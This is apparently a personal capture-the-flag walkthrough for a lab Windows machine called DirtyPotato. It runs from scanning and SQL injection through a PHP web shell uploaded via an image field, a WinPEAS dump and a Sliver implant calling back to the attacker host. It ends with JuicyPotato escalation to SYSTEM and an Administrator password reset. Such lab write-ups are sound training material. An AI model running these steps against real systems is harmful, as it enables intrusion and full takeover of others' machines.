# CTF 10 DirtyPotato

## Scout Regiments (Network Service Enumeration)

{% stepper %}
{% step %}
### Netdiscover Scan
{% endstep %}

{% step %}
### Nmap Scan

```bash
nmap -sT -A -Pn -n –min-rate 10000 IPAddress
```

#### Nmap Results

**IP Address**

`192.168.100.101`

**Ports**

`80,443,3306,7680`
{% endstep %}

{% step %}
### Nikto Scan

```bash
nikto -h IPAddress
```
{% endstep %}

{% step %}
### Viewed the Web Page
{% endstep %}

{% step %}
### Directory Scouting

```bash
gobuster dir –u http://192.168.100.101 -w /usr/etc/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```
{% endstep %}

{% step %}
### Wappalyzer

* The results shows that the operating system is Windows Servers.
* The Web service is Apache and the Programming Language is PHP.
{% endstep %}

{% step %}
### SearchSploit

* Search the web title in searchploit

```bash
searchsploit Car Rental Managemt System
```
{% endstep %}

{% step %}
### Download the exploit and analysis the code how does this exploit works

```bash
Searchsploit –m php/webapps/49025.py
```
{% endstep %}

{% step %}
### SQL Injection

* Save the traffice using burp and use the `*` parameter at the username field where its vulnerably and saveit and give it to SQLMAP

```bash
sqlmap -r dirtysql.txt --batch
```

* The searchsploit payload show the url and username parameters are vulnerably.
* The exploit goes to cars pages and add the cars details.
* The exploit shows that file upload images parameters is vulnerably and add the one linear php shell as an images.
* Create an one linear php shell save and upload it on the images parameters as and three.php.
* Now the exploit shows that there is an assets directory which is confirm by Gobuster on directory scouting above where all the images are stored.
{% endstep %}
{% endstepper %}

To check if the files is uploaded and as the exploit show to go the directory of assest which Gobuster confirm above:

```
http://192.168.100.101/admin/assets/uploads/cars_img/
```

After check the php files is there, there is an ID number generate by web application use that ID number and the php files name and the shell cmd:

```
http://192.168.100.101/admin/assets/uploads/cars_img/1711737960_three.php?cmd=whoami
```

* Try php revshells but got no luck

## Upgrading the TTY shell to meterpreter

Set up the SMB server using impacket to copy the WinPEAS privileges escalation:

```bash
impacket-smbserver -smb2support smb /home/hasanrehni/Desktop/CTF/DirtyPotato
```

```
C:\xampp\htdocs\admin\assets\uploads\cars_img>

C:\xampp\htdocs\admin\assets\uploads\cars_img>net view \\192.168.100.100

Shared resources at \\192.168.100.100

(null)

Share name  Type  Used as  Comment

-------------------------------------------------------------------------------

SMB         Disk

The command completed successfully.

C:\xampp\htdocs\admin\assets\uploads\cars_img>dir \\192.168.100.100\SMB

Volume in drive \\192.168.100.100\SMB has no label.

Volume Serial Number is ABCD-EFAA

Directory of \\192.168.100.100\SMB

03/30/2024  08:49 PM            73,802 revshell_80.exe
03/30/2024  01:15 AM         2,387,968 winPEASany.exe
03/30/2024  12:16 AM                31 three.php
03/29/2024  11:33 PM               563 dirtysql.txt
03/30/2024  12:38 AM             2,589 rev2shell.php
03/30/2024  12:47 AM             2,588 rev5.php
03/30/2024  12:34 AM                76 revphp.php
03/30/2024  12:49 AM                75 rev6.php
03/29/2024  11:08 PM             3,230 49025.py
03/30/2024  12:14 AM                46 one.php
03/30/2024  12:42 AM               117 rev3.php
03/29/2024  10:34 PM             1,829 DirtyPotatNmapScam.txt
03/30/2024  12:46 AM             2,590 rev4.php
03/29/2024  11:56 PM                46 onelineshell.img
03/30/2024  12:13 AM                48 onelineshell.php
03/30/2024  12:54 AM            73,802 meteshell.exe
03/30/2024  12:15 AM                46 two.php

17 File(s)      2,549,446 bytes
0 Dir(s)  15,353,524,575,401,294,572 bytes free

C:\xampp\htdocs\admin\assets\uploads\cars_img>copy \\192.168.100.100\SMB\winPEASany.exe

1 file(s) copied.

C:\xampp\htdocs\admin\assets\uploads\cars_img>
```

<details>

<summary>WinPEAS Analysis</summary>

```
[?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)

[*] OS Version: 1803 (17134)

[*] Enumerating installed KBs...

[!] CVE-2019-0836 : VULNERABLE

[>] https://exploit-db.com/exploits/46718

[>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

[!] CVE-2019-0841 : VULNERABLE

[>] https://github.com/rogue-kdc/CVE-2019-0841

[>] https://rastamouse.me/tags/cve-2019-0841/

[!] CVE-2019-1064 : VULNERABLE

[>] https://www.rythmstick.net/posts/cve-2019-1064/

[!] CVE-2019-1130 : VULNERABLE

[>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

[!] CVE-2019-1253 : VULNERABLE

[>] https://github.com/padovah4ck/CVE-2019-1253

[>] https://github.com/sgabe/CVE-2019-1253

[!] CVE-2019-1315 : VULNERABLE

[>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

[!] CVE-2019-1385 : VULNERABLE

[>] https://www.youtube.com/watch?v=K6gHnr-VkAg

[!] CVE-2019-1388 : VULNERABLE

[>] https://github.com/jas502n/CVE-2019-1388

[!] CVE-2019-1405 : VULNERABLE

[>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/

[>] https://github.com/apt69/COMahawk

[!] CVE-2020-0668 : VULNERABLE

[>] https://github.com/itm4n/SysTracingPoc

[!] CVE-2020-0683 : VULNERABLE

[>] https://github.com/padovah4ck/CVE-2020-0683

[>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1

[!] CVE-2020-1013 : VULNERABLE

[>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

[*] Finished. Found 12 potential vulnerabilities.

����������͹ PowerShell Settings

PowerShell v2 Version: 2.0

PowerShell v5 Version: 5.1.17134.1

PowerShell Core Version:

Transcription Settings:

Module Logging Settings:

Scriptblock Logging Settings:

PS history file: C:\Users\R0b\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS history size: 84B

����������͹ Drives Information

� Remember that you should search more info inside the other drives

A:\ (Type: Removable)

C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 25 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories])

D:\ (Type: CDRom)

����������͹ Current Token privileges

� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation

SeShutdownPrivilege: DISABLED

SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

SeUndockPrivilege: DISABLED

SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

SeIncreaseWorkingSetPrivilege: DISABLED

SeTimeZonePrivilege: DISABLED

����������͹ Home folders found

C:\Users\Administrator

C:\Users\All Users

C:\Users\Default

C:\Users\Default User

C:\Users\DefaultAppPool

C:\Users\Public : Service [WriteData/CreateFiles]

C:\Users\R0b : R0b [AllAccess]

�����������������������������������͹ Processes Information �������������������������������������

����������͹ Interesting Processes -non Microsoft-

� Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes

cmd(4132)[C:\Windows\SysWOW64\cmd.exe] -- POwn: R0b

Command Line: cmd.exe /c ".\1711740240_meteshell.exe"

=================================================================================================

httpd(2328)[C:\xampp\apache\bin\httpd.exe] -- POwn: R0b

Permissions: Authenticated Users [WriteData/CreateFiles]

Possible DLL Hijacking folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])

Command Line: "C:\xampp\apache\bin\httpd.exe" -k runservice

=================================================================================================

winPEASany(4888)[C:\xampp\htdocs\admin\assets\uploads\cars_img\winPEASany.exe] -- POwn: R0b -- isDotNet

Permissions: R0b [AllAccess], Authenticated Users [WriteData/CreateFiles]

Possible DLL Hijacking folder: C:\xampp\htdocs\admin\assets\uploads\cars_img (R0b [AllAccess], Authenticated Users [WriteData/CreateFiles])

Command Line: .\winPEASany.exe

=================================================================================================

conhost(4668)[C:\Windows\system32\conhost.exe] -- POwn: R0b

Command Line: \??\C:\Windows\system32\conhost.exe 0x4

httpd(3032)[C:\xampp\apache\bin\httpd.exe] -- POwn: R0b

Permissions: Authenticated Users [WriteData/CreateFiles]

Possible DLL Hijacking folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])

Command Line: C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache

=================================================================================================

Interesting

����������͹ Autorun Applications

� Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run

Key: SecurityHealth

Folder: C:\Program Files\Windows Defender

File: C:\Program Files\Windows Defender\MSASCuiL.exe (Unquoted and Space detected)

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run

Key: VMware VM3DService Process

Folder: C:\Windows\system32

File: C:\Windows\system32\vm3dservice.exe -u

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run

Key: VMware User Process

Folder: C:\Program Files\VMware\VMware Tools

File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)

=================================================================================================

RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

RegPerms: R0b [FullControl]

Key: OneDrive

Folder: C:\Users\R0b\AppData\Local\Microsoft\OneDrive

FolderPerms: R0b [AllAccess]

File: C:\Users\R0b\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background

FilePerms: R0b [AllAccess]

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders

Key: Common Startup

Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

Key: Common Startup

Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)

=================================================================================================

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

Key: Shell

Folder: None (PATH Injection)

File: explorer.exe

=================================================================================================

RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot

Key: AlternateShell

Folder: None (PATH Injection)

File: cmd.exe

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers

Key: Adobe Type Manager

Folder: None (PATH Injection)

File: atmfd.dll

=================================================================================================

RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers

Key: Adobe Type Manager

Folder: None (PATH Injection)

File: atmfd.dll

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32

Key: midimapper

Folder: None (PATH Injection)

File: midimap.dll

=================================================================================================

=================================================================================================

RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32

Key: msacm.msg711

Folder: None (PATH Injection)

File: msg711.acm

=================================================================================================

=================================================================================================

RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32

Key: midimapper

Folder: None (PATH Injection)

File: midimap.dll

=================================================================================================

=================================================================================================

RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls

Key: coml2

Folder: None (PATH Injection)

File: coml2.dll

=================================================================================================

=================================================================================================

RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}

Key: StubPath

Folder: \

FolderPerms: Authenticated Users [AppendData/CreateDirectories]

File: /UserInstall

=================================================================================================

=================================================================================================

Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)

=================================================================================================

Folder: C:\Users\R0b\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

FolderPerms: R0b [AllAccess]

File: C:\Users\R0b\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)

FilePerms: R0b [AllAccess]

=================================================================================================

================================================================================================

Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)

=================================================================================================

Folder: C:\Users\R0b\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

FolderPerms: R0b [AllAccess]

File: C:\Users\R0b\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)

FilePerms: R0b [AllAccess]

=================================================================================================

Folder: C:\windows\tasks

FolderPerms: Authenticated Users [WriteData/CreateFiles]

=================================================================================================

Folder: C:\windows\system32\tasks

FolderPerms: Authenticated Users [WriteData/CreateFiles]

=================================================================================================

Folder: C:\windows

File: C:\windows\system.ini

=================================================================================================

Folder: C:\windows

File: C:\windows\win.ini

=================================================================================================

Key: From WMIC

Folder: C:\Users\R0b\AppData\Local\Microsoft\OneDrive

FolderPerms: R0b [AllAccess]

File: C:\Users\R0b\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background

FilePerms: R0b [AllAccess]

=================================================================================================

Key: From WMIC

Folder: C:\Program Files\Windows Defender

File: C:\Program Files\Windows Defender\MSASCuiL.exe (Unquoted and Space detected)

=================================================================================================

����������͹ Unattend Files

C:\Windows\Panther\Unattend.xml

<Password>*SENSITIVE*DATA*DELETED*</Password>     <Enabled>true</Enabled>      <Username>R0b</Username>     </AutoLogon>    <UserAccounts>     <LocalAccounts>      <LocalAccount wcm:action="add">       <Password>*SENSITIVE*DATA*DELETED*</Password>

����������͹ Looking for possible password files in users homes

�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

����������͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)

File Permissions "C:\Users\R0b\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": R0b [AllAccess]

File Permissions "C:\Users\R0b\AppData\Local\Microsoft\OneDrive\OneDrive.exe": R0b [AllAccess]

File Permissions "C:\Users\R0b\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": R0b [AllAccess]

File Permissions "C:\Users\R0b\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": R0b [AllAccess]

����������͹ Found PHP_files Files

File: C:\xampp\php\scripts\configure.php

File: C:\xampp\php\pear\PHPUnit\Util\Configuration.php

File: C:\xampp\php\pear\PHP\Debug\Renderer\HTML\DivConfig.php

File: C:\xampp\php\pear\PHP\Debug\Renderer\HTML\TableConfig.php

File: C:\xampp\php\pear\PEAR\Command\Config.php

File: C:\xampp\php\pear\PEAR\Config.php

File: C:\xampp\php\pear\Table\Storage.php

�����������������������������������͹ File Analysis �������������������������������������

����������͹ Found MySQL Files

Folder: C:\xampp\licenses\mysql

Folder: C:\xampp\licenses\strawberry\licenses\mysql

Folder: C:\xampp\mysql

Folder: C:\xampp\php\data\phpdocref\mysql

Folder: C:\xampp\perl\vendor\lib\DBD\mysql

Folder: C:\xampp\perl\vendor\lib\auto\DBD\mysql

Folder: C:\xampp\mysql\backup\mysql

Folder: C:\xampp\mysql\data\mysql

Folder: C:\xampp\mysql

����������͹ Found Apache-Nginx Files

File: C:\xampp\php\php.ini
```

</details>

## Improving the terminal

Create the exploit:

```bash
[server] sliver > generate --http 192.168.100.100 --os windows --arch 64bit

[*] Generating new windows/amd64 implant binary

[*] Symbol obfuscation is enabled

[*] Build completed in 36s

[*] Implant saved to /home/hasanrehni/Desktop/CTF/DirtyPotato/WONDERFUL_REQUIREMENT.exe
```

Started the listener:

```
[server] sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #3

[server] sliver > sessions

[*] No sessions 🙁

[*] Session e7e1c962 WONDERFUL_REQUIREMENT - 192.168.100.101:49879 (DirtyPotato) - windows/amd64 - Sat, 30 Mar 2024 13:09:58 EDT

[*] Session c22074f8 WONDERFUL_REQUIREMENT - 192.168.100.101:49885 (DirtyPotato) - windows/amd64 - Sat, 30 Mar 2024 13:10:04 EDT

[*] Session 98f250ab WONDERFUL_REQUIREMENT - 192.168.100.101:49894 (DirtyPotato) - windows/amd64 - Sat, 30 Mar 2024 13:10:08 EDT

[*] Session d6ec34b8 WONDERFUL_REQUIREMENT - 192.168.100.101:49924 (DirtyPotato) - windows/amd64 - Sat, 30 Mar 2024 13:10:26 EDT

[server] sliver >

[*] Session d5ec6c9c WONDERFUL_REQUIREMENT - 192.168.100.101:49959 (DirtyPotato) - windows/amd64 - Sat, 30 Mar 2024 13:10:43 EDT

[server] sliver > sessions

ID         Transport   Remote Address          Hostname      Username          Operating System   Health

========== =========== ======================= ============= ================= ================== =========

98f250ab   http(s)     192.168.100.101:49894   DirtyPotato   DIRTYPOTATO\R0b   windows/amd64      [ALIVE]

c22074f8   http(s)     192.168.100.101:49885   DirtyPotato   DIRTYPOTATO\R0b   windows/amd64      [ALIVE]

d5ec6c9c   http(s)     192.168.100.101:49959   DirtyPotato   DIRTYPOTATO\R0b   windows/amd64      [ALIVE]

d6ec34b8   http(s)     192.168.100.101:49924   DirtyPotato   DIRTYPOTATO\R0b   windows/amd64      [ALIVE]

e7e1c962   http(s)     192.168.100.101:49879   DirtyPotato   DIRTYPOTATO\R0b   windows/amd64      [ALIVE]

[server] sliver > sessions -i 98f250ab

[*] Active session WONDERFUL_REQUIREMENT (98f250ab)

[server] sliver (WONDERFUL_REQUIREMENT) > cat ConsoleHost_history.txt

Uninstall-WindowsFeature Windows-DefenderUninstall-WindowsFeature Windows-Defender
```

> after searching in internet found the JuicyPotato exploit

> If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.

```
Current Token privileges

� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation

SeShutdownPrivilege: DISABLED

SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

SeUndockPrivilege: DISABLED

SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

SeIncreaseWorkingSetPrivilege: DISABLED

SeTimeZonePrivilege: DISABLED
```

```
C:\xampp\htdocs\admin\assets\uploads\cars_img>.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337

COM -> recv failed with error: 10038

C:\xampp\htdocs\admin\assets\uploads\cars_img>.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t {4991d34b-80a1-4291-83b6-3328366b9097}

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337

......

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

[+] authresult 0

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

Waiting for auth...

C:\xampp\htdocs\admin\assets\uploads\cars_img>

C:\xampp\htdocs\admin\assets\uploads\cars_img>

C:\xampp\htdocs\admin\assets\uploads\cars_img>

C:\xampp\htdocs\admin\assets\uploads\cars_img>whoami

nt authority\system

C:\xampp\htdocs\admin\assets\uploads\cars_img>

c:\Program Files>net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
R0b                      WDAGUtilityAccount

The command completed with one or more errors.

c:\Program Files>net user Administrator Hasanrhani0

The command completed successfully.
```

* This machine has:
  * `SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED`
  * `SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED`
  * `SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED`
* Searching on internet found that its vulnerably to BITS, and its Main Vulnerbility name is RottenPotatoNG and _with a bit of juice,_ is JuicePotao.
* **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer), [**RoguePotato**](https://github.com/antonioCoco/RoguePotato), [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) can be used to **leverage the same privileges and gain** `NT AUTHORITY\SYSTEM` level access.
* Github Link: `https://github.com/ohpe/juicy-potato`

> RottenPotatao and its variants leverage privilege escation chain based on BITS

{% hint style="info" %}
BITS can be used by Windows to download updates to your local system.

For More info: https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal?redirectedfrom=MSDN

BITS (Background Intelligent Transfer Service) is a Windows service that helps transfer files between clients and servers in a more efficient and resilient manner. CLSIDs can be used in relation to BITS when referencing specific objects or interfaces within the BITS service.

other than `BITS` there are a several COM servers which can abuse. They just need to:

A CLSID (Class Identifier) is a unique identifier that is used to identify a specific COM (Component Object Model) object or interface in Windows. It is represented as a globally unique identifier (GUID) in the registry.

COM (Component Object Model) is a binary-interface standard for software components introduced by Microsoft. Some COM objects can be used to perform operations with elevated privileges, and this is what JuicyPotato leverages for privilege escalation.

The CLSID `{4991d34b-80a1-4291-83b6-3328366b9097}` mentioned is specifically associated with BITS (Background Intelligent Transfer Service) in Windows. BITS is a component of Microsoft Windows operating systems that facilitates prioritized, throttled, and asynchronous transfer of files between machines using idle network bandwidth.

When JuicyPotato attempts to exploit this CLSID using the `-t` option, it tries to create a COM object instance and manipulate it to gain elevated privileges, typically leading to the execution of a specified program (in your case, `cmd.exe`) with elevated permissions.

JuicyPotato is an exploit which exploit the CLSID (its a globally unique identifier a COM Class object) so this exploit allow session 0 to SYSTEM.

This exploit has a requirement which is user account should be enable `SeAssignPrimaryTokenPrivilige` and `SeImpersonatePrivilege`.

This exploit Runs on COM Port 1337 and execute cmd.exe using both requirement of `CreteProcessWithTokenW` and `CreateProcessAsUser` then the shell pop or converted into `NT Authority\System`
{% endhint %}
